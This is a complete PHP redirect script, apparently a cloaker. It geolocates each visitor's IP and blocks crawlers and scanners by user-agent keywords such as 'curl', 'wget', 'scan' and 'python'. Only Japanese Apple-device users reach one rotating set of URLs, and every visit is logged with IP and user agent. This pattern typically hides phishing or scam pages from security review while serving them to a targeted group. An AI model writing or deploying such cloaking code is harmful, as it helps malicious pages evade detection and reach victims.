<?php
$config = json_decode(file_get_contents("config.json"), true);
$counterFile = "counter.json";
$counter = file_exists($counterFile) ? json_decode(file_get_contents($counterFile), true) : ['apple' => 0, 'other' => 0];

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

// === Ambil informasi IP ===
$ipinfoToken = ''; // Jika punya token ipinfo.io (opsional)
$infoUrl = "http://ipinfo.io/{$ip}/json" . ($ipinfoToken ? "?token={$ipinfoToken}" : '');
$ipInfo = @json_decode(@file_get_contents($infoUrl), true);
$org = $ipInfo['org'] ?? '';
$country = $ipInfo['country'] ?? 'UNKNOWN';

// === Blok Bot ===
$botKeywords = ['bot', 'crawl', 'spider', 'slurp', 'fetch', 'scan', 'curl', 'wget', 'python', 'scrapy'];
foreach ($botKeywords as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        redirectTo('other', "Blocked: Bot detected");
    }
}

// === Deteksi Apple Device ===
$isApple = preg_match('/iPhone|iPad|iPod|Macintosh|Mac OS X/i', $userAgent);

// === Logika Redirect ===
if ($country === 'JP' && $isApple) {
    redirectTo('apple', "Access granted: JP + Apple");
} else {
    redirectTo('other', "Redirected: not both JP & Apple");
}

// === Fungsi Redirect ===
function redirectTo($type, $note = '') {
    global $config, $counter, $counterFile, $ip, $userAgent, $country;

    $urls = $config[$type] ?? [];
    $index = $counter[$type] ?? 0;
    $redirectUrl = $urls[$index] ?? $urls[0] ?? null;

    // Logging
    $timestamp = date('Y-m-d H:i:s');
    $logFile = __DIR__ . '/clicklog.txt';
    $logEntry = "$timestamp|$ip|$country|$userAgent|$type";
    if ($note) $logEntry .= "|$note";
    $logEntry .= PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    // Update counter dan redirect
    if ($redirectUrl) {
        $counter[$type] = ($index + 1) % count($urls);
        file_put_contents($counterFile, json_encode($counter));
        header("Location: $redirectUrl", true, 302);
        exit;
    } else {
        http_response_code(500);
        echo "Redirect URL not found for '$type'.";
        exit;
    }
}
